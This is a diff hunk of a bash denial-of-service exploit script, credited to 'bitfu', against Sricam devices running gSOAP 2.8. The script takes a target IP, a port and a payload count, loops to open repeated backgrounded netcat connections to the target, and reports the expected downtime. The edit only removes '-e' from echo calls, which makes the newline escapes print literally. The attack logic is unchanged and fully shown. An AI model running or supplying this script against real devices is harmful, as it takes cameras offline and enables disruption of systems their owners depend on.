@@ -22,19 +22,19 @@
 
 if [ -z "$3" ]; then
 	echo "#############################################################################"
-	echo -e "[*] Sricam gSOAP 2.8 Denial of Service exploit by bitfu"
-	echo -e "\n[*] Usage: $0 <IP_Address> <Port> <#_DoS_Payloads>"
+	echo "[*] Sricam gSOAP 2.8 Denial of Service exploit by bitfu"
+	echo "\n[*] Usage: $0 <IP_Address> <Port> <#_DoS_Payloads>"
 	echo "[*] Example: $0 127.0.0.1 5000 10"
-	echo -e "\n[!] Each DoS payload sent adds another 20 seconds downtime.\n"
+	echo "\n[!] Each DoS payload sent adds another 20 seconds downtime.\n"
 	exit 0
 fi
 
 time=$(expr $3 \* 20)
 echo "[*] Sricam gSOAP 2.8 Denial of Service exploit by bitfu"
-echo -e "\n[+] Sending $3 DoS payloads..."
+echo "\n[+] Sending $3 DoS payloads..."
 echo "[+] Expected downtime: $time seconds"
 for dos in $(seq 1 $3); do
 netcat $1 $2 &
 done
-echo -e "\n[!] $dos DoS payloads sent to: $1:$2"
+echo "\n[!] $dos DoS payloads sent to: $1:$2"
 echo
